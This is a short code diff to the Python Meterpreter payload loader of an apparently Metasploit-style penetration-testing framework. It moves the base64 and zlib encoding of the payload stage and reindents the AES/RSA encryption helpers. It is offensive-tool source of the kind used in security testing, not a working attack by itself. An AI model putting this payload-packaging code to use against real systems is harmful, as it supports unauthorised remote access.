@@ -47,7 +47,7 @@ module Payload::Python::MeterpreterLoader
   end
 
   def stage_payload(opts={})
-    stage_meterpreter(opts)
+    Rex::Text.encode_base64(Rex::Text.zlib_deflate(stage_meterpreter(opts)))
   end
 
   # Get the raw Python Meterpreter stage and patch in values based on the
@@ -141,7 +141,7 @@ module Payload::Python::MeterpreterLoader
       met.sub!("#{offset_string}# PATCH-SETUP-STAGELESS-TCP-SOCKET #", socket_setup)
     end
 
-    Rex::Text.encode_base64(Rex::Text.zlib_deflate(met))
+    met
   end
 
   def python_encryptor_loader
@@ -157,11 +157,11 @@ sys.modules['met_aes'] = met_aes
 sys.modules['met_rsa'] = met_rsa
 import met_rsa, met_aes
 def met_rsa_encrypt(der, msg):
-  return met_rsa.rsa_enc(der, msg)
+    return met_rsa.rsa_enc(der, msg)
 def met_aes_encrypt(key, iv, pt):
-	return met_aes.AESCBC(key).encrypt(iv, pt)
+    return met_aes.AESCBC(key).encrypt(iv, pt)
 def met_aes_decrypt(key, iv, pt):
-	return met_aes.AESCBC(key).decrypt(iv, pt)
+    return met_aes.AESCBC(key).decrypt(iv, pt)
     ?
   end
 
